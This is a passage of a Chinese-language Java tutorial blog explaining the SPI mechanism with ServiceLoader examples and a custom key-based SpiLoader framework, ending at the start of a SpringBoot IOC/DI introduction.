</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240727203537.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240727204157.webp" alt="image.png|500"></p>
<p>公司 A 在 <code>simple-api</code> 提供的服务接口（这就是 SPI 中 1️ Service 接口部分 1️⃣）：</p>
<pre><code class="language-java">package top.uuanqin;

/**
 * @author uuanqin
 */
public interface InternetService {
    void connectInternet();
}
</code></pre>
<p>服务提供者中国移动在 <code>simple-isp-mobile</code> 在 <code>pom.xml</code> 中导入了 <code>simple-api</code>，并为其编写了实现类（北京移动 <code>BeijingMobile</code> 和苏州移动 <code>SuzhouMobile</code> 的联网服务，这些就是 SPI 中的 Service Provider 部分 2️⃣）：</p>
<pre><code class="language-xml">&lt;dependencies&gt;
	&lt;dependency&gt;
		&lt;groupId&gt;top.uuanqin&lt;/groupId&gt;
		&lt;artifactId&gt;simple-api&lt;/artifactId&gt;
		&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
	&lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<pre><code class="language-java">package cn.mobile;

import top.uuanqin.InternetService;

/**
 * @author uuanqin
 */
public class BeijingMobile implements InternetService {
    @Override
    public void connectInternet() {
        System.out.println(&quot;【中国移动（北京移动）】欢迎使用中国移动联网服务！&quot;);
    }
}
</code></pre>
<p>中国移动在配置目录中放置 SPI 配置文件，文件名是 Service 接口的全限定名，内容是 Service Provider 类的全限定名。多行表示多个 Service Provider。</p>
<pre><code>cn.mobile.BeijingMobile  
cn.mobile.SuzhouMobile
</code></pre>
<p>中国移动 <code>simple-isp-mobile</code> 目录结构如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240727220435.webp" alt="image.png"></p>
<p>同样的，服务提供者中国联通 <code>simple-isp-unicom</code> 也编写了实现类，假设它只编写了一个实现类 <code>ChinaUnicom</code>。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240727220509.webp" alt="image.png"></p>
<p>公司 A 在实际的应用项目 <code>simple-company</code> 中使用了上网服务（包含 SPI 的 ServiceLoader 部分 3️⃣）：</p>
<pre><code class="language-java">package top.uuanqin;

import java.util.ServiceLoader;

public class Main {
    public static void main(String[] args) {
        ServiceLoader&lt;InternetService&gt; loader = ServiceLoader.load(InternetService.class);
        for(InternetService provider: loader){
            provider.connectInternet();
        }
    }
}
</code></pre>
<p><code>pom.xml</code> 中除了引用自己公司定义的 api 外，我想要使用哪个公司的上网服务，就导入哪个公司的 jar 包。</p>
<pre><code class="language-xml">&lt;dependencies&gt;
	&lt;dependency&gt;
		&lt;groupId&gt;top.uuanqin&lt;/groupId&gt;
		&lt;artifactId&gt;simple-api&lt;/artifactId&gt;
		&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
	&lt;/dependency&gt;
	&lt;dependency&gt;
		&lt;groupId&gt;cn.mobile&lt;/groupId&gt;
		&lt;artifactId&gt;simple-isp-mobile&lt;/artifactId&gt;
		&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
	&lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<p>运行 <code>Main</code> 方法结果如下：</p>
<pre><code>【中国移动（北京移动）】欢迎使用中国移动联网服务！
【中国移动（苏州移动）】欢迎使用中国移动联网服务！
</code></pre>
<p>如果 <code>pom.xml</code> 导入的是中国联通的 jar 包，那么 <code>Main</code> 方法返回：</p>
<pre><code>【中国联通】欢迎使用中国联通的无线上网服务！
</code></pre>
<blockquote>
<p>[!hint] 如果没打印成功，检查一下 <code>META-INF.services</code> 目录是一个文件夹还是两级文件夹！<br>
在 IDEA 中选择这个取消压缩中间文件夹名：<br>
<img src="https://cdn.gallery.uuanqin.top/img/20240727221048.webp" alt="image.png|500"></p>
</blockquote>
<h2>尝试写一个简单的 ServiceLoader</h2>
<p>在阅读 Java ServiceLoader 源码之前，可以先看一下下面的代码进行理解。下面代码是一个简化了的 ServiceLoader。</p>
<p>代码引入工具包以减少编写的代码量：</p>
<pre><code class="language-xml">&lt;!-- https://doc.hutool.cn/ --&gt;
&lt;dependency&gt;
	&lt;groupId&gt;cn.hutool&lt;/groupId&gt;
	&lt;artifactId&gt;hutool-all&lt;/artifactId&gt;
	&lt;version&gt;5.8.16&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<pre><code class="language-java">package top.uuanqin;

import cn.hutool.core.io.resource.ResourceUtil;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class MyServiceLoader&lt;S&gt; implements Iterable&lt;S&gt; {

    // 对应的接口 Class 模板
    private final Class&lt;S&gt; service;

    // 对应实现类的 可以有多个，用 List 进行封装
    private final List&lt;S&gt; providers = new ArrayList&lt;&gt;();

    // 类加载器
    private final ClassLoader classLoader;

    // 暴露给外部使用的方法，通过调用这个方法可以开始加载自己定制的实现流程。
    public static &lt;S&gt; MyServiceLoader&lt;S&gt; load(Class&lt;S&gt; service) {
        return new MyServiceLoader&lt;&gt;(service);
    }

    // 构造方法私有化
    private MyServiceLoader(Class&lt;S&gt; service) {
        this.service = service;
        this.classLoader = Thread.currentThread().getContextClassLoader();
        doLoad();
    }

    // 关键方法，加载具体实现类的逻辑
    private void doLoad() {
        List&lt;URL&gt; resources = null;
        // 读取所有 jar 包里面 META-INF/services 包下面的文件，这个文件名就是接口名，然后文件里面的内容就是具体的实现类的路径加全类名
        resources = ResourceUtil.getResources(&quot;META-INF/services/&quot; + service.getName());
        for (URL resource : resources) {
            try {
                InputStreamReader inputStreamReader = new InputStreamReader(resource.openStream());
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    // 通过反射拿到实现类的实例
                    Class&lt;?&gt; clazz = Class.forName(line, false, classLoader);
                    // 如果声明的接口跟这个具体的实现类是属于同一类型，（可以理解为Java的一种多态，接口跟实现类、父类和子类等等这种关系。）则构造实例
                    if (service.isAssignableFrom(clazz)) {
                        S instance = (S) clazz.newInstance();
                        // 把当前构造的实例对象添加到 Provider的列表里面
                        providers.add(instance);
                    }
                }
            } catch (Exception e) {
                System.out.println(&quot;类加载异常&quot;);
            }
        }
    }

    // 返回spi接口对应的具体实现类列表
    public List&lt;S&gt; getProviders() {
        return providers;
    }

    // ************** 迭代器的实现 ********************** //
    @Override
    public Iterator&lt;S&gt; iterator() {
        return providers.iterator();
    }
}
</code></pre>
<p>把上例中 Main 函数的 <code>ServiceLoader</code> 换成 <code>MyServiceLoader</code> 将得到同样的结果。</p>
<p>更定制化的 ServiceLoader 实现以及相关应用场景详见这篇文章：<a href="#3886683086" title="SPI 概念及案例实践（下）" class="record-link ">SPI 概念及案例实践（下）</a></p>
<h1>【拓展】Java SPI 与 SpringBoot 的自动配置</h1>
<p>SpringBoot 自动配置，即大名鼎鼎的 Auto-Configuration 是指基于你引入的依赖 Jar 包，对 SpringBoot 应用进行自动配置。提供了自动配置功能的依赖 Jar 包通常被称为 starter，例如 <code>mybatis-spring-boot-starter</code> 等等。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240727202855.webp" alt="image.png"></p>
<p>SpringBoot 与 jdk 在 SPI 机制上，存在些许的差别，但本质上还是事先定义一套规范，来完成对实现类或者组件的动态发现。</p>
<ul>
<li>在获取实现类名称集合的层面上，SpringBoot 借助于 SpringFactoriesLoader 加载 <code>spring.factories</code> 配置文件，而 jdk 借助于 ServiceLoader 读取指定路径。</li>
<li>在是否实例化实现类的层面上，SpringBoot 会依据 <code>@Conditional</code> 注解来判断是否进行实例化并注入进容器中，而 jdk 会在 <code>next()</code> 方法内部懒加载实现类。</li>
</ul>
<p>更多参考详见本站文章：<a href="#565697069" title="SpringBoot 的原理以及写一个自定义 Starter" class="record-link ">SpringBoot 的原理以及写一个自定义 Starter</a></p>
<h1>源代码</h1>
<p><a href="https://github.com/uuanqin/SPI-simple-example"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=SPI-simple-example" alt="Readme Card"></a></p>
<p>GitHub仓库地址：<a href="https://github.com/uuanqin/SPI-simple-example">uuanqin/SPI-simple-example (github.com)</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://javaguide.cn/java/basis/spi.html#service-provider">Java SPI 机制详解 | JavaGuide</a></li>
<li><a href="https://www.bilibili.com/video/BV1RY4y1v7mN/">10分钟让你彻底明白Java SPI，附实例代码演示#安员外很有码_哔哩哔哩_bilibili</a></li>
<li><a href="https://yuyuanweb.feishu.cn/wiki/EweIwSYsXiEvCDkzS8BcTiAonyc">知识星球·编程导航 - 手写 RFC 框架</a></li>
<li><a href="https://blog.csdn.net/qq_33591903/article/details/119843446">SpringBoot的自动装配原理、自定义starter与spi机制，一网打尽_springboot 有很多的启动器 说一下启动器的自动装配原理-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="565697069">
                            <a href="#565697069">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 的原理以及写一个自定义 Starter</span>
                                
                                <div class="record-links-context hover">
                                    <p>更多参考详见本站文章：<a href="#565697069" title="SpringBoot 的原理以及写一个自定义 Starter" class="record-link highlight">SpringBoot 的原理以及写一个自定义 Starter</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3886683086">
                            <a href="#3886683086">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SPI 概念及案例实践（下）</span>
                                
                                <div class="record-links-context hover">
                                    <p>更定制化的 ServiceLoader 实现以及相关应用场景详见这篇文章：<a href="#3886683086" title="SPI 概念及案例实践（下）" class="record-link highlight">SPI 概念及案例实践（下）</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3886683086">
                            <a href="#3886683086">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SPI 概念及案例实践（下）</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!hint] 阅读前提示<br>
为了更好地理解文章，建议先阅读 <a href="#2896927132" title="SPI 概念及案例实践（上）" class="record-link highlight">SPI 概念及案例实践（上）</a>。</p>
</blockquote>
<p>在 <a href="#2896927132" title="SPI 概念及案例实践（上）" class="record-link highlight">这篇文章</a> 中我们学习并实践了 Java 原生的 SPI 机制。但我们还想更便捷的使用 SPI。设想这样一个场景：当公司 A 使用互联网连接服务时，我们直接这样调用服务：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3886683086" class="record">
            <header>
                <h1 class="record-title">SPI 概念及案例实践（下）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('SPI');">SPI</button>
                    
                    <button class="btn" onclick="activeTag('ServiceLoader');">ServiceLoader</button>
                    
                    <button class="btn" onclick="activeTag('Java');">Java</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/1/2024</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>写一个更灵活的 SPI 框架</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>e7aa13ce</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240731214853.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!hint] 阅读前提示<br>
为了更好地理解文章，建议先阅读 <a href="#2896927132" title="SPI 概念及案例实践（上）" class="record-link ">SPI 概念及案例实践（上）</a>。</p>
</blockquote>
<p>在 <a href="#2896927132" title="SPI 概念及案例实践（上）" class="record-link ">这篇文章</a> 中我们学习并实践了 Java 原生的 SPI 机制。但我们还想更便捷的使用 SPI。设想这样一个场景：当公司 A 使用互联网连接服务时，我们直接这样调用服务：</p>
<pre><code class="language-java">// 获得互联网连接服务，具体的实现类为中国移动公司提供互联网连接服务
InternetService internetService1 = InternetServiceFactory(&quot;cn-mobile-beijing&quot;);
// 在同样的应用中，我们可以获取另一种互联网连接服务的实现
InternetService internetService2 = InternetServiceFactory(&quot;cn-unicom&quot;);
</code></pre>
<p>这样就不需要在 <code>pom.xml</code> 中导入不同的 jar 包以获取实现类，又或者在多个实现类中选择一个具体的服务实现。编写好一个 SPI 框架，我们能更好地调用和扩展 SPI 服务。</p>
<p>本文源代码详见文末。</p>
<h1>写一个 SPI 框架</h1>
<h2>重写 ServiceLoader</h2>
<p>现在，公司 A 决定写一套 SPI 框架。</p>
<p>新建模块 <code>simple-company-frame</code>。在 <code>simple-company-frame</code> 模块 <code>pom.xml</code> 中导入以下模块以提供日志功能：</p>
<pre><code class="language-xml">&lt;dependencies&gt;
	&lt;dependency&gt;  
		&lt;groupId&gt;top.uuanqin&lt;/groupId&gt;  
		&lt;artifactId&gt;simple-api&lt;/artifactId&gt;  
		&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;  
	&lt;/dependency&gt;

	&lt;!-- https://doc.hutool.cn/ --&gt;
	&lt;dependency&gt;
		&lt;groupId&gt;cn.hutool&lt;/groupId&gt;
		&lt;artifactId&gt;hutool-all&lt;/artifactId&gt;
		&lt;version&gt;5.8.16&lt;/version&gt;
	&lt;/dependency&gt;

	&lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-classic --&gt;
	&lt;dependency&gt;
		&lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
		&lt;artifactId&gt;logback-classic&lt;/artifactId&gt;
		&lt;version&gt;1.3.12&lt;/version&gt;
	&lt;/dependency&gt;
	&lt;dependency&gt;
		&lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
		&lt;artifactId&gt;lombok&lt;/artifactId&gt;
		&lt;version&gt;1.18.32&lt;/version&gt;
		&lt;scope&gt;compile&lt;/scope&gt;
	&lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<p>重写 ServiceLoader ：</p>
<pre><code class="language-java">package top.uuanqin.frame;

import cn.hutool.core.io.resource.ResourceUtil;
import lombok.extern.slf4j.Slf4j;


import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * SPI 加载器（支持键值对映射）
 */
@Slf4j
public class SpiLoader {

    /**
     * 存储已加载的类：接口名 =&gt;（key =&gt; 实现类）
     */
    private static Map&lt;String, Map&lt;String, Class&lt;?&gt;&gt;&gt; loaderMap = new ConcurrentHashMap&lt;&gt;();

    /**
     * 对象实例缓存（避免重复 new），类路径 =&gt; 对象实例，单例模式
     */
    private static Map&lt;String, Object&gt; instanceCache = new ConcurrentHashMap&lt;&gt;();

    /**
     * 系统 SPI 目录
     */
    private static final String RPC_SYSTEM_SPI_DIR = &quot;META-INF/rpc/system/&quot;;

    /**
     * 用户自定义 SPI 目录
     */
    private static final String RPC_CUSTOM_SPI_DIR = &quot;META-INF/rpc/custom/&quot;;

    /**
     * 扫描路径
     */
    private static final String[] SCAN_DIRS = new String[]{RPC_SYSTEM_SPI_DIR, RPC_CUSTOM_SPI_DIR};

    /**
     * 获取某个接口的实例
     *
     * @param tClass
     * @param key
     * @param &lt;T&gt;
     * @return
     */
    public static &lt;T&gt; T getInstance(Class&lt;?&gt; tClass, String key) {
        String tClassName = tClass.getName();
        Map&lt;String, Class&lt;?&gt;&gt; keyClassMap = loaderMap.get(tClassName);
        if (keyClassMap == null) {
            throw new RuntimeException(String.format(&quot;SpiLoader 未加载 %s 类型&quot;, tClassName));
        }
        if (!keyClassMap.containsKey(key)) {
            throw new RuntimeException(String.format(&quot;SpiLoader 的 %s 不存在 key=%s 的类型&quot;, tClassName, key));
        }
        // 获取到要加载的实现类型
        Class&lt;?&gt; implClass = keyClassMap.get(key);
        // 从实例缓存中加载指定类型的实例
        String implClassName = implClass.getName();
        if (!instanceCache.containsKey(implClassName)) {
            try {
                instanceCache.put(implClassName, implClass.newInstance());
            } catch (InstantiationException | IllegalAccessException e) {
                String errorMsg = String.format(&quot;%s 类实例化失败&quot;, implClassName);
                throw new RuntimeException(errorMsg, e);
            }
        }
        return (T) instanceCache.get(implClassName);
    }

    /**
     * 加载某个类型
     *
     * @param loadClass
     */
    public static Map&lt;String, Class&lt;?&gt;&gt; load(Class&lt;?&gt; loadClass) {
        log.info(&quot;加载类型为 {} 的 SPI&quot;, loadClass.getName());
        // 扫描路径，用户自定义的 SPI 优先级高于系统 SPI
        Map&lt;String, Class&lt;?&gt;&gt; keyClassMap = new HashMap&lt;&gt;();
        for (String scanDir : SCAN_DIRS) {
            // ResourceUtil.getResources 获得资源的URL 路径用/分隔
            List&lt;URL&gt; resources = ResourceUtil.getResources(scanDir + loadClass.getName()); // 获取配置文件是使用了 ResourceUtil.getResources，而不是通过文件路径获取。因为如果框架作为依赖被引入，是无法得到正确文件路径的。
            // 读取每个资源文件
            for (URL resource : resources) {
                try {
                    InputStreamReader inputStreamReader = new InputStreamReader(resource.openStream());
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        String[] strArray = line.split(&quot;=&quot;);
                        if (strArray.length &gt; 1) {
                            String key = strArray[0];
                            String className = strArray[1];
                            keyClassMap.put(key, Class.forName(className));
                        }
                    }
                } catch (Exception e) {
                    log.error(&quot;spi resource load error&quot;, e);
                }
            }
        }
        loaderMap.put(loadClass.getName(), keyClassMap);
        return keyClassMap;
    }
}
</code></pre>
<p>相当于一个工具类，提供了读取配置并加载实现类的方法。</p>
<p>关键实现如下：</p>
<ul>
<li>用 Map 来存储已加载的配置信息 键名 =&gt; 实现类。</li>
<li>扫描指定路径，读取每个配置文件，获取到 键名 =&gt; 实现类 信息并存储在 Map 中。</li>
<li>定义获取实例方法，根据用户传入的接口和键名，从 Map 中找到对应的实现类，然后通过反射获取到实现类对象。可以维护一个对象实例缓存，创建过一次的对象从缓存中读取即可。</li>
</ul>
<p>我们扫描的 SPI 目录有两个：</p>
<ul>
<li><code>META-INF/my/system/</code> 框架的 SPI 目录</li>
<li><code>META-INF/my/custom/</code> 用户自定义的 SPI 目录（优先级高）</li>
</ul>
<h2>为框架编写自己 <code>InternetService</code> 的实现类</h2>
<p>在 <code>simple-company-frame</code> 模块新建包 <code>internet</code>，存放与互联网连接相关的代码。</p>
<p>写随便两个公司自己编写的实现类，用于后续测试。比如：</p>
<pre><code class="language-java">package top.uuanqin.frame.internet;

import top.uuanqin.InternetService;

/**
 * @author uuanqin
 */
public class LocalConnection implements InternetService {
    @Override
    public void connectInternet() {
        System.out.println(&quot;访问 127.0.0.1 ......&quot;);
    }
}

</code></pre>
<h2>写一个 <code>InternetService</code> 工厂类</h2>
<p>互联网连接服务对象是可以复用的，没必要每次执行连接操作前都创建一个新的对象。所以我们可以使用设计模式中的 工厂模式 + 单例模式 来简化创建和获取互联网连接服务对象的操作。</p>
<pre><code class="language-java">package top.uuanqin.frame.internet;



import top.uuanqin.InternetService;
import top.uuanqin.frame.SpiLoader;

/**
 * 互联网连接工厂（用于获取互联网连接服务对象）
 *
 * 互联网连接服务对象是可以复用的，没必要每次执行连接操作前都创建一个新的对象。所以我们可以使用设计模式中的 工厂模式 + 单例模式 来简化创建和获取互联网连接服务对象的操作
 */
public class InternetServiceFactory {

    // 使用静态代码块，在工厂首次加载时，就会调用 SpiLoader 的 load 方法加载序列化器接口的所有实现类，之后就可以通过调用 getInstance 方法获取指定的实现类对象了。

    static {
        SpiLoader.load(InternetService.class);
    }

    /**
     * 默认连接对象
     */
    private static final InternetService DEFAULT_SERIALIZER = new LocalConnection();

    /**
     * 获取实例
     *
     * @param key
     * @return
     */
    public static InternetService getInstance(String key) {
        return SpiLoader.getInstance(InternetService.class, key);
    }

}
</code></pre>
<h2>写配置</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240731231752.webp" alt="image.png"></p>
<h1>测试</h1>
<p>回到 <code>simple-company</code> 模块。</p>
<p>pom.xml 中引入框架：</p>
<pre><code class="language-xml">&lt;dependency&gt;
	&lt;groupId&gt;top.uuanqin&lt;/groupId&gt;
	&lt;artifactId&gt;simple-company-frame&lt;/artifactId&gt;
	&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>编写测试用的主函数：</p>
<pre><code class="language-java">package top.uuanqin;

import top.uuanqin.frame.internet.InternetServiceFactory;

public class SpiMain {
    public static void main(String[] args) {
        InternetService internetService = InternetServiceFactory.getInstance(&quot;local&quot;);
        internetService.connectInternet();
    }
}

</code></pre>
<p>返回结果：</p>
<pre><code>访问 127.0.0.1 ......
</code></pre>
<p>如果 main 函数代码改成这样，将得到不一样的结果：</p>
<pre><code class="language-java">InternetService internetService = InternetServiceFactory.getInstance(&quot;fake&quot;);
// 结果：
// 你没有插网线！
InternetService internetService = InternetServiceFactory.getInstance(&quot;ddd&quot;);
// 错误：
// Exception in thread &quot;main&quot; java.lang.RuntimeException: SpiLoader 的 top.uuanqin.InternetService 不存在 key=ddd 的类型
</code></pre>
<h1>服务拓展</h1>
<p>既然公司 A 写了一套框架，那么现在公司 A 要求所有的运营商：</p>
<ul>
<li>把所有连接互联网的 SPI 实现通通放在 <code>META-INF/my/system/</code> 下！</li>
<li>实现服务类名前面加上个 Key！</li>
</ul>
<p>中国移动和中国联通运营商们都乖乖照做了：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240731233104.webp" alt="image.png"></p>
<p>框架 <code>simple-company-frame</code> 的 <code>pom.xml</code> 中同时导入了这两个服务供应商的包：</p>
<pre><code class="language-xml">&lt;dependency&gt;
	&lt;groupId&gt;cn.mobile&lt;/groupId&gt;
	&lt;artifactId&gt;simple-isp-mobile&lt;/artifactId&gt;
	&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
	&lt;groupId&gt;cn.unicom&lt;/groupId&gt;
	&lt;artifactId&gt;simple-isp-unicom&lt;/artifactId&gt;
	&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>下面回到 <code>simple-company</code> 模块测试：</p>
<pre><code class="language-java">package top.uuanqin;

import top.uuanqin.frame.internet.InternetServiceFactory;

public class SpiMain {
    public static void main(String[] args) {
        InternetService internetService = InternetServiceFactory.getInstance(&quot;cn-mobile-beijing&quot;);
        internetService.connectInternet();
    }
}
</code></pre>
<p>输出：</p>
<pre><code>【中国移动（北京移动）】欢迎使用中国移动联网服务！
</code></pre>
<p>这样，公司 A 可以通过切换 key 随时指定需要的服务了！</p>
<h1>用户自定义实现类</h1>
<p>公司 A 想自己写几个临时实现类，但是不想让框架 <code>simple-company-frame</code> 导入。这时 <code>META-INF/my/custom/</code> 目录就起作用了。</p>
<p><code>simple-company</code> 模块新建了自己的临时实现类：</p>
<pre><code class="language-java">package top.uuanqin;

/**
* @author uuanqin
*/
public class TempConnection implements InternetService {
   @Override
   public void connectInternet() {
       System.out.println(&quot;公司 A 的临时连接。&quot;);
   }
}

</code></pre>
<p>编写 SPI 配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240731234049.webp" alt="image.png"></p>
<p>测试：</p>
<pre><code class="language-java">package top.uuanqin;

import top.uuanqin.frame.internet.InternetServiceFactory;

public class SpiMain {
    public static void main(String[] args) {
        InternetService internetService = InternetServiceFactory.getInstance(&quot;temp&quot;);
        internetService.connectInternet();
    }
}

</code></pre>
<p>输出：</p>
<pre><code>公司 A 的临时连接。
</code></pre>
<h1>改进与拓展思路</h1>
<h2>SPI 框架复用</h2>
<p>在上面的代码中，<code>SpiLoader</code> 并没有存在于「互联网服务」相关的硬编码。我们可以仿照上面的工厂写法，写出更多的服务工厂。这样我们的 Main 函数就可以是：</p>
<pre><code class="language-java">InternetService internetService = InternetServiceFactory.getInstance(&quot;cn-mobile-suzhou&quot;);
TVService tvService = TVServiceFactory.getInstance(&quot;xiaomi&quot;);
FoodService foodService = FoodServiceFactory.getInstance(&quot;kfc&quot;);
// ...
</code></pre>
<h2>常量存储</h2>
<p>写一个接口类，专门存储字符串常量以供使用：</p>
<pre><code class="language-java">package top.uuanqin.frame.internet;

/**
 * @author uuanqin
 */
public interface ConnectionKeys {
    String FAKE = &quot;fake&quot;;
    
    String LOCAL = &quot;local&quot;;
    
    String CN_MOBILE_SUZHOU = &quot;cn-mobile-suzhou&quot;;
}

</code></pre>
<h2>配合全局配置</h2>
<p>结合 [[单例模式的应用——为 Java 程序应用全局配置|这篇文章]]，我们可以通过修改配置文件直接选择我们需要的服务。</p>
<h1>源代码</h1>
<p><a href="https://github.com/uuanqin/SPI-simple-example"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=SPI-simple-example" alt="Readme Card"></a></p>
<p>GitHub仓库地址：<a href="https://github.com/uuanqin/SPI-simple-example">uuanqin/SPI-simple-example (github.com)</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1RY4y1v7mN/">10分钟让你彻底明白Java SPI，附实例代码演示#安员外很有码_哔哩哔哩_bilibili</a></li>
<li><a href="https://yuyuanweb.feishu.cn/wiki/EweIwSYsXiEvCDkzS8BcTiAonyc">知识星球·编程导航 - 手写 RFC 框架</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="2896927132">
                            <a href="#2896927132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SPI 概念及案例实践（上）</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!hint] 阅读前提示<br>
为了更好地理解文章，建议先阅读 <a href="#2896927132" title="SPI 概念及案例实践（上）" class="record-link highlight">SPI 概念及案例实践（上）</a>。</p>
</blockquote>
<p>在 <a href="#2896927132" title="SPI 概念及案例实践（上）" class="record-link highlight">这篇文章</a> 中我们学习并实践了 Java 原生的 SPI 机制。但我们还想更便捷的使用 SPI。设想这样一个场景：当公司 A 使用互联网连接服务时，我们直接这样调用服务：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2896927132">
                            <a href="#2896927132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SPI 概念及案例实践（上）</span>
                                
                                <div class="record-links-context hover">
                                    <p>更定制化的 ServiceLoader 实现以及相关应用场景详见这篇文章：<a href="#3886683086" title="SPI 概念及案例实践（下）" class="record-link highlight">SPI 概念及案例实践（下）</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1713466548" class="record">
            <header>
                <h1 class="record-title">SpringBoot 中的 IOC &amp; DI 入门</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('SpringBoot');">SpringBoot</button>
                    
                    <button class="btn" onclick="activeTag('Java');">Java</button>
                    
                    <button class="btn" onclick="activeTag('Bean');">Bean</button>
                    
                    <button class="btn" onclick="activeTag('IOC');">IOC</button>
                    
                    <button class="btn" onclick="activeTag('DI');">DI</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/2/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240723234813.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>入门案例感受 IOC 容器的基本工作方式。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>66216cb4</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!notice] SpringBoot 的两大核心</p>
<ol>
<li>IOC：控制反转</li>
<li>[[SpringBoot 中的面向切面编程|AOP]]：面向切面编程</li>
</ol>
</blockquote>
<h1>基本概念</h1>
<p>三层架构：</p>
<ol>
<li>Controller：控制层，接收前端发送的请求，对请求进行处理，并响应数据。</li>
<li>Service：业务逻辑层，处理具体的业务逻辑。</li>
<li>Dao：数据访问层（Data Access Object）（持久层），负责数据访问操作，包括数据的增、删、改、查。</li>
</ol>
<p>分层解耦：</p>
<ul>
<li>内聚：软件中各个功能模块内部的功能联系。</li>
<li>耦合：衡量软件中各个层/模块之间的依赖、关联的程度。</li>
<li>软件设计原则：高内聚低耦合</li>
</ul>
<p>重要概念：</p>
<ul>
<li>控制反转：Inversion Of Control，简称 IOC。对象的创建控制权由程序自身转移到外部（容器），这种思想称为控制反转。这个容器我们称为 IOC 容器，或者 Spring 容器。</li>
